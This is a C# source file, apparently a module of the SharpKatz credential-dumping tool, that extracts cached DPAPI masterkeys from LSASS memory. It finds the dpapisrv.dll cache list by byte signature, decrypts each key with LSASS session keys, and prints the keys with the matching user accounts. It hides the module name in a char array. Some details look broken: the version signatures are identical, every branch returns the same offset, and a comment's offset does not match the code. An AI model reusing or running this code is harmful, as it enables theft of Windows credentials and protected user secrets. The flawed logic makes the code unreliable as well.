//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: sekurlsa::dpapi - Dump cached DPAPI masterkeys from LSASS memory
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class DpapiSekurlsa
    {
        static long max_search_size = 200000;

        // DPAPI cached masterkey entry structure (from dpapisrv.dll)
        // This structure represents KIWI_MASTERKEY_CACHE_ENTRY in mimikatz
        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MASTERKEY_CACHE_ENTRY
        {
            public IntPtr Flink;     // LIST_ENTRY
            public IntPtr Blink;
            public LUID LogonId;     // user LUID
            public Guid KeyUid;      // masterkey GUID
            public FILETIME insertTime;
            public uint keySize;     // size of decrypted key
            // Followed by: decrypted masterkey data[keySize]
        }

        // DPAPISrv signature patterns for finding the masterkey cache list
        // These signatures target g_MasterKeyCacheList in dpapisrv.dll

        // Windows 10 1507+
        // Pattern: 4C 89 1D ?? ?? ?? ?? 48 89 05 ?? ?? ?? ??
        // Offset to list head: +43 from signature
        private static readonly byte[] DPAPI_SIGNATURE_1507 = new byte[] {
            0x4C, 0x89, 0x1D };

        // Windows 10 1607+
        // Pattern: same family, offset adjusted
        private static readonly byte[] DPAPI_SIGNATURE_1607 = new byte[] {
            0x4C, 0x89, 0x1D };

        // Fallback generic pattern for various builds
        // dpapisrv!g_MasterKeyCacheList access pattern
        private static readonly byte[] DPAPI_SIGNATURE_GENERIC = new byte[] {
            0x4C, 0x89, 0x1D };

        /// <summary>
        /// Dump cached DPAPI masterkeys from LSASS memory
        /// Pattern: search dpapisrv.dll for g_MasterKeyCacheList signature,
        /// traverse the linked list, read and decrypt each cached masterkey
        /// </summary>
        public static int FindCredentials(IntPtr hLsass, IntPtr dpapisrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            int count = 0;

            Console.WriteLine("\n  [*] sekurlsa::dpapi");

            // Search for the masterkey cache list in dpapisrv.dll
            string sDpapisrv = new string(new char[] { 'd', 'p', 'a', 'p', 'i', 's', 'r', 'v', '.', 'd', 'l', 'l' });

            // Try to find g_MasterKeyCacheList using signature search
            byte[] signature = GetDpapiSignature(oshelper);
            int listOffset = GetDpapiListOffset(oshelper);

            IntPtr masterKeyCacheListAddr;
            try
            {
                masterKeyCacheListAddr = Utility.GetListAdress(hLsass, dpapisrvMem, sDpapisrv, max_search_size, listOffset, signature);
            }
            catch (Exception)
            {
                Console.WriteLine("   [-] dpapisrv.dll signature not found in LSASS");
                Console.WriteLine("   [-] DPAPI masterkey cache extraction requires dpapisrv.dll loaded in LSASS");
                return 0;
            }

            if (masterKeyCacheListAddr == IntPtr.Zero)
            {
                Console.WriteLine("   [-] g_MasterKeyCacheList not found");
                return 0;
            }

            Console.WriteLine("   [*] g_MasterKeyCacheList found at: 0x{0:X}", masterKeyCacheListAddr.ToInt64());

            // Read the list head (Flink pointer)
            int ptrSize = IntPtr.Size;
            byte[] listHeadBytes = Utility.ReadFromLsass(ref hLsass, masterKeyCacheListAddr, ptrSize * 2);
            if (listHeadBytes == null || listHeadBytes.Length < ptrSize)
            {
                Console.WriteLine("   [-] Failed to read masterkey cache list head");
                return 0;
            }

            IntPtr flink;
            if (ptrSize == 8)
                flink = new IntPtr(BitConverter.ToInt64(listHeadBytes, 0));
            else
                flink = new IntPtr(BitConverter.ToInt32(listHeadBytes, 0));

            // Traverse the linked list
            IntPtr current = flink;
            int maxEntries = 500; // safety limit
            int entrySize = Marshal.SizeOf(typeof(KIWI_MASTERKEY_CACHE_ENTRY));

            while (current != masterKeyCacheListAddr && current != IntPtr.Zero && maxEntries-- > 0)
            {
                try
                {
                    // Read the cache entry
                    byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, current, entrySize + 128); // extra for key data
                    if (entryBytes == null || entryBytes.Length < entrySize)
                        break;

                    KIWI_MASTERKEY_CACHE_ENTRY entry = Utility.ReadStruct<KIWI_MASTERKEY_CACHE_ENTRY>(entryBytes);

                    if (entry.keySize > 0 && entry.keySize <= 512)
                    {
                        // Read the encrypted key data (follows the struct)
                        byte[] encryptedKey = new byte[entry.keySize];
                        if (entrySize + entry.keySize <= entryBytes.Length)
                        {
                            Array.Copy(entryBytes, entrySize, encryptedKey, 0, (int)entry.keySize);
                        }
                        else
                        {
                            // Read separately if not enough data
                            IntPtr keyDataAddr = IntPtr.Add(current, entrySize);
                            byte[] keyData = Utility.ReadFromLsass(ref hLsass, keyDataAddr, (int)entry.keySize);
                            if (keyData == null)
                                goto nextEntry;
                            encryptedKey = keyData;
                        }

                        // Decrypt the cached masterkey using LSASS session keys
                        byte[] decryptedKey = null;
                        try
                        {
                            decryptedKey = BCrypt.DecryptCredentials(encryptedKey, iv, aeskey, deskey);
                        }
                        catch
                        {
                            // Try raw (some entries may not be encrypted in all scenarios)
                            decryptedKey = encryptedKey;
                        }

                        if (decryptedKey != null && decryptedKey.Length > 0)
                        {
                            Console.WriteLine("\n   [*] Cached Masterkey");
                            Console.WriteLine("    GUID       : {{{0}}}", entry.KeyUid.ToString());
                            Console.WriteLine("    LUID       : {0}:{1} ({2})",
                                entry.LogonId.HighPart.ToString("x8"),
                                entry.LogonId.LowPart.ToString("x8"),
                                ((ulong)entry.LogonId.HighPart << 32 | (uint)entry.LogonId.LowPart));
                            Console.Write("    Masterkey  : ");
                            Console.WriteLine(Utility.PrintHashBytes(decryptedKey));

                            // Add to blob cache for later use
                            DpapiBlob.AddMasterkey(entry.KeyUid.ToString(), decryptedKey);

                            // Associate with logon session if possible
                            LUID luid = entry.LogonId;
                            Logon currentLogon = logonlist.FirstOrDefault(x =>
                                x.LogonId.HighPart == luid.HighPart &&
                                x.LogonId.LowPart == luid.LowPart);

                            if (currentLogon != null)
                            {
                                Console.WriteLine("    User       : {0}\\{1}",
                                    currentLogon.LogonDomain, currentLogon.UserName);
                            }

                            count++;
                        }
                    }

                    nextEntry:
                    // Move to next entry
                    current = entry.Flink;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("   [-] Error reading cache entry: {0}", ex.Message);
                    break;
                }
            }

            if (count > 0)
            {
                Console.WriteLine("\n   [+] {0} cached DPAPI masterkey(s) found", count);
            }
            else
            {
                Console.WriteLine("   [-] No cached masterkeys found (list may be empty or signatures outdated)");
            }

            return count;
        }

        /// <summary>
        /// Get the DPAPI signature pattern based on OS build
        /// These signatures target the g_MasterKeyCacheList initialization in dpapisrv.dll
        /// </summary>
        private static byte[] GetDpapiSignature(OSVersionHelper oshelper)
        {
            // Windows 10 patterns
            // The signature is a MOV instruction that references g_MasterKeyCacheList
            // Pattern varies slightly between builds

            if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_1607)
            {
                // Windows 10 1607+ (14393+)
                // mov [g_MasterKeyCacheList+8], r11
                // Pattern: 4C 89 1D xx xx xx xx
                return new byte[] { 0x4C, 0x89, 0x1D };
            }
            else if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_1507)
            {
                // Windows 10 1507+ (10240+)
                return new byte[] { 0x4C, 0x89, 0x1D };
            }
            else
            {
                // Older builds
                // mov [g_MasterKeyCacheList], rax
                return new byte[] { 0x48, 0x89, 0x05 };
            }
        }

        /// <summary>
        /// Get the offset from signature to the list address
        /// This is build-version-specific
        /// </summary>
        private static int GetDpapiListOffset(OSVersionHelper oshelper)
        {
            // The offset from the signature match to the actual RIP-relative
            // address of g_MasterKeyCacheList
            // Typical layout:
            //   sig (3 bytes) + rel32 (4 bytes) = 7 bytes instruction
            //   The list address = instruction_end + rel32

            if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_1607)
            {
                return -4; // typical for most builds
            }
            else if (oshelper.build >= OSVersionHelper.KULL_M_WIN_BUILD_10_1507)
            {
                return -4;
            }
            else
            {
                return -4;
            }
        }

        /// <summary>
        /// Standalone entry point - dump DPAPI masterkeys from LSASS
        /// without requiring the full logon session pipeline
        /// </summary>
        public static int DumpMasterkeys(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey)
        {
            List<Logon> emptyLogonList = new List<Logon>();

            // Get dpapisrv.dll base in LSASS
            string sDpapisrv = new string(new char[] { 'd', 'p', 'a', 'p', 'i', 's', 'r', 'v', '.', 'd', 'l', 'l' });

            IntPtr dpapisrvMem = IntPtr.Zero;
            try
            {
                // Try to get module base - use the same mechanism as other modules
                dpapisrvMem = Utility.GetModuleBaseAddress(hLsass, sDpapisrv);
            }
            catch
            {
                Console.WriteLine("   [-] Could not find dpapisrv.dll in LSASS");
                return 0;
            }

            if (dpapisrvMem == IntPtr.Zero)
            {
                Console.WriteLine("   [-] dpapisrv.dll not loaded in LSASS");
                return 0;
            }

            return FindCredentials(hLsass, dpapisrvMem, oshelper, iv, aeskey, deskey, emptyLogonList);
        }
    }
}
